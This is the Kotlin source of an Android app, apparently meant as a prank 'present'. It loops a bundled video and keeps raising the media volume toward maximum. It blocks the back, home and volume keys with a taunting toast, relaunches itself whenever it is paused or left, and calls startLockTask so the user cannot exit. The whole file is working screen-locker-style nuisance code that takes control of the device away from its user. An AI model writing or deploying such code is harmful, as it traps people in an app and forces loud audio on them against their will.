package com.example.newpresent

import android.app.Activity
import android.content.Intent
import android.media.AudioManager
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.view.KeyEvent
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.widget.Toast
import android.widget.VideoView

class MainActivity : Activity() {

    private lateinit var videoView: VideoView
    private lateinit var audioManager: AudioManager
    private val volumeMax = 100 // 最大音量值
    private val volumeUpdateInterval = 10L // 音量更新间隔（毫秒）

    private val volumeHandler = Handler()
    private val volumeRunnable = object : Runnable {
        override fun run() {
            val currentVolume = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC)
            if (currentVolume < volumeMax) {
                val targetVolume = currentVolume + 1
                audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, targetVolume, 0)
                volumeHandler.postDelayed(this, volumeUpdateInterval)
            }
        }
    }
    private fun hideNavigationBar() {
        val decorView: View = window.decorView
        decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_IMMERSIVE
                        or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        or View.SYSTEM_UI_FLAG_FULLSCREEN
                )
    }
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        window.addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN)
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)

        audioManager = getSystemService(AudioManager::class.java)

        hideNavigationBar()
        videoView = findViewById(R.id.videoView)
        videoView.setOnTouchListener(object : View.OnTouchListener {
            override fun onTouch(v: View?, event: MotionEvent?): Boolean {
                showSystemUI()
                return false
            }
        })

        val videoPath = "android.resource://" + packageName + "/" + R.raw.video
        videoView.setVideoURI(Uri.parse(videoPath))

        videoView.setOnPreparedListener {
            videoView.start()
            volumeHandler.postDelayed(volumeRunnable, volumeUpdateInterval)
        }

        videoView.setOnCompletionListener {
            videoView.seekTo(0)
            videoView.start()
        }
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (keyCode==KeyEvent.KEYCODE_HOME|| keyCode == KeyEvent.KEYCODE_BACK || keyCode== KeyEvent.KEYCODE_VOLUME_DOWN || keyCode == KeyEvent.KEYCODE_VOLUME_UP) {
            showToast("好好听着，别想着退出！")
            return true
        }
        return super.onKeyDown(keyCode, event)
    }

    override fun onUserLeaveHint() {
        super.onUserLeaveHint()
        // 当用户点击 Home 键时，立即重启应用
        val intent = Intent(this, MainActivity::class.java)
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        startActivity(intent)
    }

    override fun onDestroy() {
        super.onDestroy()
        volumeHandler.removeCallbacks(volumeRunnable)
    }

    private fun showToast(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }

    private fun showSystemUI() {
        @Suppress("DEPRECATION")
        window.decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                )
    }

    override fun onPause() {
        super.onPause()
        // 在每次暂停时重新启动自己，阻止用户退出应用
        val intent = Intent(applicationContext, MainActivity::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
        startActivity(intent)
    }

    override fun onResume() {
        super.onResume()
        startLockTask()
    }
}